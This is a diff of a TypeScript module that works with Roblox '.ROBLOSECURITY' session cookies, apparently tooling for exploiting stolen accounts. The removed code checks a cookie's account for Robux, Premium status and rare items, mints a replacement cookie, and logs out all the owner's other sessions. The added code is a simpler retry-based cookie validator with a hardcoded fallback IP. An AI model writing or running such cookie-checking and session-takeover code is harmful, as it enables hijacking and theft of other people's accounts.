@@ -1,203 +1,77 @@
 import axios from 'axios';
+import { CookieJar } from 'tough-cookie';
+import { wrapper } from 'axios-cookiejar-support';
+import dns from 'dns/promises';
 
-export interface ValidateResult {
-  valid: boolean;
-  username?: string;
-  displayName?: string;
-  userId?: number;
-  robux?: number;
-  isPremium?: boolean;
-  accountAgeDays?: number;
-  hasHeadless?: boolean;
-  hasKorblox?: boolean;
-  debug: string;
-}
+const FALLBACK_IPS: Record<string, string> = {
+  'users.roblox.com': '104.18.2.63',
+};
 
-export interface RefreshResult {
-  newCookie: string | null;
-  status: string;
-  debug: string;
-}
+let dnsCache: Record<string, string> = {};
 
-// ─── Helpers ───────────────────────────────────────────────────────────────
-
-function cookieHeader(cookie: string) {
-  return {
-    Cookie: `.ROBLOSECURITY=${cookie.trim()}`,
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-  };
-}
-
-function makeLogger() {
-  const lines: string[] = [];
-  return {
-    log: (msg: string) => { lines.push(msg); console.log('[ROBLOX]', msg); },
-    dump: () => lines.join('\n'),
-  };
-}
-
-// ─── Validate ─────────────────────────────────────────────────────────────
-
-export async function validateCookie(cookie: string): Promise<ValidateResult> {
-  const { log, dump } = makeLogger();
-  const trimmed = cookie.trim();
-
+async function resolveDomain(domain: string): Promise<string> {
+  if (dnsCache[domain]) return dnsCache[domain];
   try {
-    const authResp = await axios.get('https://users.roblox.com/v1/users/authenticated', {
-      headers: cookieHeader(trimmed),
-      validateStatus: () => true,
-    });
-
-    if (authResp.status !== 200) {
-      log(`Auth failed: ${authResp.status}`);
-      return { valid: false, debug: dump() };
+    const ip = await dns.lookup(domain).then(res => res.address);
+    dnsCache[domain] = ip;
+    return ip;
+  } catch {
+    const fallback = FALLBACK_IPS[domain];
+    if (fallback) {
+      dnsCache[domain] = fallback;
+      return fallback;
     }
-
-    const { id: userId, name: username, displayName } = authResp.data as {
-      id: number; name: string; displayName: string;
-    };
-    log(`Authenticated: ${username} (${userId})`);
-
-    const hdrs = cookieHeader(trimmed);
-    const [currencyResp, premiumResp, userResp, headlessResp, korbloxResp] = await Promise.all([
-      axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`,                    { headers: hdrs, validateStatus: () => true }),
-      axios.get(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, { headers: hdrs, validateStatus: () => true }),
-      axios.get(`https://users.roblox.com/v1/users/${userId}`,                               { validateStatus: () => true }),
-      axios.get(`https://inventory.roblox.com/v1/users/${userId}/items/Bundle/474`,          { headers: hdrs, validateStatus: () => true }),
-      axios.get(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/48545806`,      { headers: hdrs, validateStatus: () => true }),
-    ]);
-
-    const robux         = currencyResp.status === 200 ? (currencyResp.data?.robux as number) : undefined;
-    const isPremium     = premiumResp.status  === 200 ? Boolean(premiumResp.data) : undefined;
-    const hasHeadless   = headlessResp.status === 200 ? (headlessResp.data?.data?.length ?? 0) > 0 : undefined;
-    const hasKorblox    = korbloxResp.status  === 200 ? (korbloxResp.data?.data?.length  ?? 0) > 0 : undefined;
-
-    let accountAgeDays: number | undefined;
-    if (userResp.status === 200 && userResp.data?.created) {
-      accountAgeDays = Math.floor((Date.now() - new Date(userResp.data.created).getTime()) / 86_400_000);
-    }
-
-    log(`Robux:${robux} Premium:${isPremium} Age:${accountAgeDays}d Headless:${hasHeadless} Korblox:${hasKorblox}`);
-    return { valid: true, username, displayName, userId, robux, isPremium, accountAgeDays, hasHeadless, hasKorblox, debug: dump() };
-
-  } catch (err: any) {
-    log(`Exception: ${err.message}`);
-    return { valid: false, debug: dump() };
+    throw new Error(`Could not resolve ${domain}`);
   }
 }
 
-// ─── Soft refresh (preserves other sessions) ──────────────────────────────
+export async function validateCookie(cookie: string, maxAttempts = 3): Promise<{ valid: boolean; userId?: number; username?: string; displayName?: string; debug: string }> {
+  const debugLines: string[] = [];
+  const log = (msg: string) => debugLines.push(msg);
 
-export async function refreshCookie(cookie: string): Promise<RefreshResult> {
-  const { log, dump } = makeLogger();
-  const trimmed = cookie.trim();
-  const baseHeaders = {
-    'Content-Type': 'application/json',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-    Cookie: `.ROBLOSECURITY=${trimmed}`,
-  };
+  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
+    try {
+      const trimmed = cookie.trim();
+      const jar = new CookieJar();
+      await jar.setCookie(`.ROBLOSECURITY=${trimmed}; Domain=.roblox.com; Path=/`, 'https://users.roblox.com');
+      const client = wrapper(axios.create({ jar }));
 
-  try {
-    // Step 1: harvest CSRF token
-    log('POST /v2/session/refresh — harvesting CSRF');
-    const csrfResp = await axios.post(
-      'https://auth.roblox.com/v2/session/refresh',
-      {},
-      { headers: baseHeaders, validateStatus: () => true },
-    );
-    log(`CSRF probe status: ${csrfResp.status}`);
+      let ip: string;
+      try {
+        ip = await resolveDomain('users.roblox.com');
+      } catch {
+        ip = 'users.roblox.com';
+      }
+      const url = `https://${ip}/v1/users/authenticated`;
+      const headers = {
+        'Host': 'users.roblox.com',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Cookie': `.ROBLOSECURITY=${trimmed}`,
+      };
+      const resp = await client.get(url, { headers, validateStatus: () => true, timeout: 10000 });
 
-    const csrf = csrfResp.headers['x-csrf-token'] as string | undefined;
-    if (!csrf) {
-      if (csrfResp.status === 401) return { newCookie: null, status: 'COOKIE_EXPIRED', debug: dump() };
-      return { newCookie: null, status: `CSRF_FAILED_${csrfResp.status}`, debug: dump() };
+      log(`Attempt ${attempt}: status ${resp.status}`);
+      if (resp.status === 200) {
+        const data = resp.data;
+        return {
+          valid: true,
+          userId: data.id,
+          username: data.name,
+          displayName: data.displayName,
+          debug: debugLines.join('\n'),
+        };
+      }
+      if (resp.status === 401) {
+        log('Cookie invalid (401)');
+        return { valid: false, debug: debugLines.join('\n') };
+      }
+    } catch (err: any) {
+      log(`Attempt ${attempt} error: ${err.message}`);
+      if (attempt === maxAttempts) {
+        return { valid: false, debug: debugLines.join('\n') };
+      }
+      await new Promise(resolve => setTimeout(resolve, 1000));
     }
-    log(`CSRF: ${csrf.slice(0, 16)}…`);
-
-    // Step 2: actual refresh
-    log('POST /v2/session/refresh — with CSRF');
-    const refreshResp = await axios.post(
-      'https://auth.roblox.com/v2/session/refresh',
-      {},
-      { headers: { ...baseHeaders, 'X-CSRF-TOKEN': csrf }, validateStatus: () => true },
-    );
-    log(`Refresh status: ${refreshResp.status}`);
-
-    if (refreshResp.status === 200) {
-      const newCookie = extractNewCookie(refreshResp.headers['set-cookie'], trimmed);
-      if (newCookie) { log(`New cookie obtained (${newCookie.length} chars)`); return { newCookie, status: 'SUCCESS', debug: dump() }; }
-      log('200 OK but no new cookie in Set-Cookie');
-      return { newCookie: null, status: 'SUCCESS_NO_COOKIE', debug: dump() };
-    }
-
-    log(`Refresh failed: ${refreshResp.status}`);
-    return { newCookie: null, status: `ERROR_${refreshResp.status}`, debug: dump() };
-
-  } catch (err: any) {
-    log(`Exception: ${err.message}`);
-    return { newCookie: null, status: `EXCEPTION`, debug: dump() };
   }
-}
-
-// ─── Kill all sessions (logout + reauthenticate) ──────────────────────────
-
-export async function killSessions(cookie: string): Promise<RefreshResult> {
-  const { log, dump } = makeLogger();
-  const trimmed = cookie.trim();
-  const baseHeaders = {
-    'Content-Type': 'application/json',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-    Cookie: `.ROBLOSECURITY=${trimmed}`,
-  };
-
-  try {
-    // Step 1: harvest CSRF token
-    log('POST /v2/logoutfromallsessionsandreauthenticate — harvesting CSRF');
-    const csrfResp = await axios.post(
-      'https://auth.roblox.com/v2/logoutfromallsessionsandreauthenticate',
-      {},
-      { headers: baseHeaders, validateStatus: () => true },
-    );
-    log(`CSRF probe status: ${csrfResp.status}`);
-
-    const csrf = csrfResp.headers['x-csrf-token'] as string | undefined;
-    if (!csrf) {
-      if (csrfResp.status === 401) return { newCookie: null, status: 'COOKIE_EXPIRED', debug: dump() };
-      return { newCookie: null, status: `CSRF_FAILED_${csrfResp.status}`, debug: dump() };
-    }
-    log(`CSRF: ${csrf.slice(0, 16)}…`);
-
-    // Step 2: actual kill
-    log('POST /v2/logoutfromallsessionsandreauthenticate — with CSRF');
-    const killResp = await axios.post(
-      'https://auth.roblox.com/v2/logoutfromallsessionsandreauthenticate',
-      {},
-      { headers: { ...baseHeaders, 'X-CSRF-TOKEN': csrf }, validateStatus: () => true },
-    );
-    log(`Kill status: ${killResp.status}`);
-
-    if (killResp.status === 200) {
-      // May also return a new cookie (ignore it — caller already has the refreshed one)
-      log('Sessions killed successfully');
-      return { newCookie: null, status: 'SUCCESS', debug: dump() };
-    }
-
-    log(`Kill failed: ${killResp.status}`);
-    return { newCookie: null, status: `ERROR_${killResp.status}`, debug: dump() };
-
-  } catch (err: any) {
-    log(`Exception: ${err.message}`);
-    return { newCookie: null, status: `EXCEPTION`, debug: dump() };
-  }
-}
-
-// ─── Internal helpers ─────────────────────────────────────────────────────
-
-function extractNewCookie(setCookie: string[] | string | undefined, oldCookie: string): string | null {
-  if (!Array.isArray(setCookie)) return null;
-  for (const raw of setCookie) {
-    const match = raw.match(/\.ROBLOSECURITY=([^;]+)/);
-    if (match && match[1] !== oldCookie) return match[1];
-  }
-  return null;
+  return { valid: false, debug: debugLines.join('\n') };
 }
